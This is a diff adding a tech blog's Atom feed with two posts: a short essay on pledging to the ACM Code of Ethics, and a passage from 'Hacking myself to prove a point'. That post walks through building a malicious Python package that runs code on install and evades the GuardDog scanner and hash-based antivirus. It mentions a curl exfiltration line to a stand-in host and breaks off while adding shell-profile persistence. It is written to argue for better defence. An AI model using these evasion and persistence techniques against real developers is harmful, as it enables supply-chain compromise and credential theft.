@@ -1,0 +1,523 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title>Mac Chaffee</title>
+	<subtitle>Mac Chaffee&#x27;s tech blog</subtitle>
+	<link href="/blog/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/blog"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2023-05-20T00:00:00+00:00</updated>
+	<id>/blog/atom.xml</id>
+	<entry xml:lang="en">
+		<title>Self-attesting to a code of ethics</title>
+		<published>2023-05-20T00:00:00+00:00</published>
+		<updated>2023-05-20T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2023/ethics-self-attestation/" type="text/html"/>
+		<id>/blog/2023/ethics-self-attestation/</id>
+		<content type="html">&lt;p&gt;Unlike many other industries like doctors, real estate agents, lawyers, social workers, etc. the tech world doesn&#x27;t have to abide by any particular code of ethics. We can argue all we want about if such a thing should be required or what should be in it, but I think clearly &lt;em&gt;something&lt;&#x2F;em&gt; is better than the &lt;em&gt;nothing&lt;&#x2F;em&gt; we have today.&lt;&#x2F;p&gt;
+&lt;p&gt;In most of the US at least, those professions I mentioned have state-recognized organizations which are legally empowered to regulate members of that profession, and they typically mandate a code of ethics. Examples:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.ncrec.gov&#x2F;Commission&#x2F;AboutUs&quot;&gt;North Carolina Real Estate Commission&lt;&#x2F;a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.ncleg.net&#x2F;EnactedLegislation&#x2F;Statutes&#x2F;HTML&#x2F;BySection&#x2F;Chapter_93A&#x2F;GS_93A-6.html&quot;&gt;List of actions for which licensees can be disciplined&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;ncswboard.gov&#x2F;about&#x2F;&quot;&gt;North Carolina Social Work Certification and Licensure Board&lt;&#x2F;a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;ncswboard.gov&#x2F;administrative-codes&#x2F;#.0501&quot;&gt;Ethical guidelines&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;I&#x27;m not qualified to say whether either group is effective at enforcing those ethical codes, but I sure am glad they have &lt;em&gt;something&lt;&#x2F;em&gt;. Something we can hold people to in case they act negligently or maliciously in their jobs.&lt;&#x2F;p&gt;
+&lt;p&gt;Consider how the median piece of software today is a user-hostile, unmaintained piece of ad-tech with your choice of dark patterns, vulnerabilities, or opaque pricing topped with inaccessibility. This is not an acceptable foundation on which to build the next generation of technology. Given the lack of official standards or ethics for 70+ years of computing history, should we be surprised this is the case? For tech workers, there&#x27;s no oath to swear, no book to sign your name in, no state licensing agency to register with. We&#x27;re all on our own here, and we&#x27;re not doing a great job on our own.&lt;&#x2F;p&gt;
+&lt;p&gt;About the closest thing to a relevant code of ethics I&#x27;ve found is the &lt;a href=&quot;https:&#x2F;&#x2F;ethics.acm.org&#x2F;&quot;&gt;ACM Code of Ethics&lt;&#x2F;a&gt;. If you&#x27;ve never truly understood the Voltaire quote &amp;quot;common sense is not so common&amp;quot; before, you&#x27;ll understand what it means after skimming the section titles and thinking about people working in certain specific tech sectors 😬&lt;&#x2F;p&gt;
+&lt;p&gt;With that said, I think we should all self-attest to following some specific code of ethics. Is this performative virtue signalling? Oh absolutely. But the reason why &amp;quot;performative&amp;quot; and &amp;quot;virtue signalling&amp;quot; have negative connotations is because of people who are all talk and no action. Being &amp;quot;performative&amp;quot; is crucial for raising awareness of important subjects. What are protests if not performative? Maybe this is all symbolic, but what long-lived institution of ethics exists today that doesn&#x27;t benefit from its symbolism? The real test is whether you&#x27;ll actually follow the code of ethics for real, and maybe the threat of looking like a huge hypocrite will be a helpful incentive.&lt;&#x2F;p&gt;
+&lt;p&gt;So here goes: I personally think it&#x27;s a good idea to consider ethics in all things relating to my profession in tech. To that end, I plan to follow the &lt;a href=&quot;https:&#x2F;&#x2F;ethics.acm.org&#x2F;&quot;&gt;ACM Code of Ethics&lt;&#x2F;a&gt;. It&#x27;s not infallible, and neither am I, but that&#x27;s no excuse to just give up.&lt;&#x2F;p&gt;
+&lt;p&gt;As a result of saying that, you now have power over me. I have no license to be revoked, but if I wrong you, you can hold me to my word. Like a service level agreement for interacting with me professionally. This one-way power dynamic feels kinda weird, right? Well, you can fix that by also self-attesting to a professional code of ethics. Doesn&#x27;t matter which one.&lt;&#x2F;p&gt;
+&lt;p&gt;What more do you want, a badge to put in your READMEs? God no.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Hacking myself to prove a point</title>
+		<published>2023-01-21T00:00:00+00:00</published>
+		<updated>2023-01-21T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2023/hacking-myself/" type="text/html"/>
+		<id>/blog/2023/hacking-myself/</id>
+		<content type="html">&lt;p&gt;If you didn&#x27;t hear, &lt;a href=&quot;https:&#x2F;&#x2F;circleci.com&#x2F;blog&#x2F;jan-4-2023-incident-report&#x2F;&quot;&gt;CircleCI recently released their report on a December 2022 security incident&lt;&#x2F;a&gt;. What stood out to me is that CircleCI seems to be doing all the &amp;quot;normal&amp;quot; security things: SSO with 2FA, endpoint protection, auditing&#x2F;logging, encryption at rest, etc. But they still got breached. I think this speaks to the unfortunate state of the modern-day security industry. It&#x27;s a thousand times easier to sell some pithy software tool that checks a compliance box than it is to sell a real security transformation.&lt;&#x2F;p&gt;
+&lt;p&gt;To me, one of the central security weaknesses companies have is ignoring local malware, which is exactly how the CircleCI hack started. People consider local malware to be &amp;quot;game over&amp;quot; and just give on on &amp;quot;defense in depth&amp;quot;. Both &lt;a href=&quot;https:&#x2F;&#x2F;developer.hashicorp.com&#x2F;vault&#x2F;docs&#x2F;internals&#x2F;security&quot;&gt;Hashicorp Vault&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;groups.google.com&#x2F;a&#x2F;chromium.org&#x2F;g&#x2F;blink-dev&#x2F;c&#x2F;OkdLUyYmY1E&#x2F;m&#x2F;NkUxgF27DAAJ&quot;&gt;Google Chrome&lt;&#x2F;a&gt; have essentially stated they don&#x27;t care about protecting from local malware.&lt;&#x2F;p&gt;
+&lt;p&gt;I believe that this mindset of ignoring local malware 1) underestimates how easy it is to do, and 2) prevents the whole security industry from focusing on this problem. To prove this, I&#x27;ll try to hack myself like I&#x27;m that poor CircleCI engineer whose laptop was exploited as the first step in the attack.&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;NOTE: I&#x27;m not actually targeting my setup at my current or past employers. I&#x27;m targeting a theoretical engineer that doesn&#x27;t exist, but is similar to an average software engineer. My examples will use macOS but this applies to Windows and Linux just as easily.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h2 id=&quot;step-1-get-onto-a-developer-s-laptop&quot;&gt;Step 1: Get onto a developer&#x27;s laptop&lt;&#x2F;h2&gt;
+&lt;p&gt;Prior to the rise of various kinds of server-side sandboxing (containers, jails, WASM, micro VMs), remote code execution was always game-over for a server. Nowadays, you might have remote code execution inside one of dozens on microservices, but with good egress restrictions and mTLS, that might be the end of your exploit chain.&lt;&#x2F;p&gt;
+&lt;p&gt;However for some tragic reason, the tooling for sandboxing on desktop operating systems is stuck in the dark ages. If I can just execute code on a developer&#x27;s laptop, I can steal SSH keys, steal cookies, hijack VPN sessions, install C2 servers, and more. And executing code on a developer&#x27;s laptop is pretty easy these days.&lt;&#x2F;p&gt;
+&lt;p&gt;To start, I&#x27;ll make a malicious Python package that will execute arbitrary code when installed.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;mkdir hack
+&lt;&#x2F;span&gt;&lt;span&gt;cd hack&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;vim setup.py
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;code&gt;setup.py:&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;setuptools
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;setuptools.command.install &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;install
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Install&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;install&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;************************ pwned ************************&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
+&lt;&#x2F;span&gt;&lt;span&gt;        install.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;setuptools.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;setup&lt;&#x2F;span&gt;&lt;span&gt;(
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;malicious&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;install_requires&lt;&#x2F;span&gt;&lt;span&gt;=[],
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cmdclass&lt;&#x2F;span&gt;&lt;span&gt;={&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;install&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;: Install}
+&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now we install the package, with extra verbosity just to see our &amp;quot;pwned&amp;quot; print statement:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$ pip install -v .
+&lt;&#x2F;span&gt;&lt;span&gt;Using pip 22.3.1 from &#x2F;hack&#x2F;venv&#x2F;lib&#x2F;python3.10&#x2F;site-packages&#x2F;pip (python 3.10)
+&lt;&#x2F;span&gt;&lt;span&gt;Processing &#x2F;hack
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;  running bdist_wheel
+&lt;&#x2F;span&gt;&lt;span&gt;  running build
+&lt;&#x2F;span&gt;&lt;span&gt;  installing to build&#x2F;bdist.macosx-12.3-x86_64&#x2F;wheel
+&lt;&#x2F;span&gt;&lt;span&gt;  running install
+&lt;&#x2F;span&gt;&lt;span&gt;  ************************ pwned ************************
+&lt;&#x2F;span&gt;&lt;span&gt;  running install_egg_info
+&lt;&#x2F;span&gt;&lt;span&gt;  running egg_info
+&lt;&#x2F;span&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;Successfully installed malicious-1.0.0
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Alright! Now we just need our target developer to install this package. This is the only hard part about our hack, but we have a lot of options:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;snyk.io&#x2F;blog&#x2F;malicious-packages-found-to-be-typo-squatting-in-pypi&#x2F;&quot;&gt;Typo-squatting a popular package&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;sockpuppets.medium.com&#x2F;how-i-hacked-ctx-and-phpass-modules-656638c6ec5e&quot;&gt;Registering someone&#x27;s expired domain&lt;&#x2F;a&gt; that they used to use for email, then issuing password resets&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.theregister.com&#x2F;2023&#x2F;01&#x2F;04&#x2F;pypi_pytorch_dependency_attack&#x2F;&quot;&gt;Tricking a popular package&lt;&#x2F;a&gt; to include your package as a dependency&lt;&#x2F;li&gt;
+&lt;li&gt;Paying to own a popular package&lt;&#x2F;li&gt;
+&lt;li&gt;Forking an abandoned project and telling everyone to migrate to yours&lt;&#x2F;li&gt;
+&lt;li&gt;Good ol&#x27; fashioned phishing&lt;&#x2F;li&gt;
+&lt;li&gt;and more&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;avoiding-detection&quot;&gt;Avoiding detection&lt;&#x2F;h3&gt;
+&lt;p&gt;With our malicious package, it would be easy to exfiltrate files, but some nosy person will probably notice a &lt;code&gt;subprocess.run([&#x27;curl&#x27;, &#x27;evil.example.com&#x27;...])&lt;&#x2F;code&gt; line on our file. DataDog publishes a tool called &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;DataDog&#x2F;guarddog&quot;&gt;GuardDog&lt;&#x2F;a&gt; that will simulate our nosy person, who we can trivially trick.&lt;&#x2F;p&gt;
+&lt;p&gt;Our current script does get noticed:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$ guarddog scan .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;span&gt;Found 1 potentially malicious indicators in .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;cmd-overwrite: found 1 source code matches
+&lt;&#x2F;span&gt;&lt;span&gt;  * Standard pip command overwritten in setup.py at malicious-1.0.0&#x2F;setup.py:12
+&lt;&#x2F;span&gt;&lt;span&gt;        setuptools.setup(
+&lt;&#x2F;span&gt;&lt;span&gt;        name=&amp;quot;malicious&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;        version=&amp;quot;1.0.0&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;        install_requires=[],
+&lt;&#x2F;span&gt;&lt;span&gt;        cmdclass={&amp;#39;install&amp;#39;: Install}
+&lt;&#x2F;span&gt;&lt;span&gt;    )
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;But that&#x27;s an easy fix. If we just assign the &lt;code&gt;{&#x27;install&#x27;: Install}&lt;&#x2F;code&gt; dictionary to a variable (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;pytorch&#x2F;pytorch&#x2F;blob&#x2F;eadbf762fc36f23ef78b084973dc39a13605db46&#x2F;setup.py#L1199&quot;&gt;like pytorch does&lt;&#x2F;a&gt;), we avoid detection:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;setup.py:&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;cmdclass = {&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;install&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;: Install}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;setuptools.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;setup&lt;&#x2F;span&gt;&lt;span&gt;(
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;malicious&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;install_requires&lt;&#x2F;span&gt;&lt;span&gt;=[],
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cmdclass&lt;&#x2F;span&gt;&lt;span&gt;=cmdclass
+&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$ guarddog scan .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;span&gt;Found 0 potentially malicious indicators scanning .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now let&#x27;s try executing some more useful code than just a print statement, such as running a shell command:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    subprocess.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;([&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;whoami&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Uh oh, we&#x27;ve been caught:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$ guarddog scan .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;span&gt;Found 1 potentially malicious indicators in .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;code-execution: found 1 source code matches
+&lt;&#x2F;span&gt;&lt;span&gt;  * setup.py file executing code at malicious-1.0.0&#x2F;setup.py:8
+&lt;&#x2F;span&gt;&lt;span&gt;        subprocess.run([&amp;#39;whoami&amp;#39;])
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;But we can bypass that easily as well. The thing about automated scanners is that they always have to balance false positives, which makes them fall apart when faced with a dedicated attacker. GuardDog can detect &amp;quot;common obfuscation methods&amp;quot;, but I guess not &lt;code&gt;getattr()&lt;&#x2F;code&gt;. The following code obtains the function &lt;code&gt;subprocess.run()&lt;&#x2F;code&gt; via the string &lt;code&gt;run&lt;&#x2F;code&gt; instead of using the dotted syntax, then executes it like normal:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;getattr&lt;&#x2F;span&gt;&lt;span&gt;(subprocess, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)([&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;whoami&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;])
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$ guarddog scan .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;span&gt;Found 0 potentially malicious indicators scanning .&#x2F;dist&#x2F;malicious-1.0.0.tar.gz
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Great! Now we have the ability to execute arbitrary code (including subprocesses) on a developer&#x27;s laptop.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;aside-won-t-someone-notice-this-malicious-code-on-github&quot;&gt;Aside: Won&#x27;t someone notice this malicious code on GitHub?&lt;&#x2F;h3&gt;
+&lt;p&gt;It shocks me that people seem to blindly trust that the code you see in an open-source repo will match the version that you end up executing. I do wish GitHub offered some way of cryptographically attesting that fact, but I can simply change the code locally before publishing to pypi. The real source code will be in the &lt;code&gt;.tar.gz&lt;&#x2F;code&gt; file uploaded to pypi, but do you really check that file for every package you download? Didn&#x27;t think so. Maybe if you had a tool like guarddog to automate that, but as you can see that&#x27;s easily circumventable.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;aside-my-antivirus-will-catch-your-setup-py-file&quot;&gt;Aside: My antivirus will catch your setup.py file!&lt;&#x2F;h3&gt;
+&lt;p&gt;Let&#x27;s fix that, shall we?&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;uuid
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(__file__, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:
+&lt;&#x2F;span&gt;&lt;span&gt;    f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;# &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(uuid.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;uuid4&lt;&#x2F;span&gt;&lt;span&gt;())}&amp;quot;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Now whenever setup.py executes, it will add a random string as a comment to the end of the file. This makes the &lt;code&gt;sha256sum&lt;&#x2F;code&gt; of the file differ for every user. Your only hope now is if your antivirus manages to quarantine the file in the few milliseconds between when &lt;code&gt;pip&lt;&#x2F;code&gt; downloads it and when it gets executed, which is unlikely.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;step-2-getting-persistence&quot;&gt;Step 2: Getting persistence&lt;&#x2F;h2&gt;
+&lt;p&gt;Since our end goal is bypassing SSO, we need to be able to execute our arbitrary code while the developer is logged in, which can be as small as a few minutes for really sensitive stuff. Just hoping setup.py executes during that window isn&#x27;t likely, but we can gain persistence trivially.&lt;&#x2F;p&gt;
+&lt;p&gt;GuardDog will notice if we create a file and mark it executable, and many OSes make running new daemons a privileged operation. So a good compromise would be to append our malicious code to an existing script that the user regularly executes (and rarely reads) while they&#x27;re logged into production. There are lots of options here, but I think &lt;code&gt;~&#x2F;.zshrc&lt;&#x2F;code&gt; (or equivalent) is a good one. That executes every time someone spawns a new terminal on macOS. The last time I touched the file was 2 months ago, so that&#x27;s a lot of time to stay undetected.&lt;&#x2F;p&gt;
+&lt;p&gt;Let&#x27;s now gain persistence, which I am just now realizing doesn&#x27;t even require &lt;code&gt;subprocess&lt;&#x2F;code&gt;, we can just write to the file directly:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
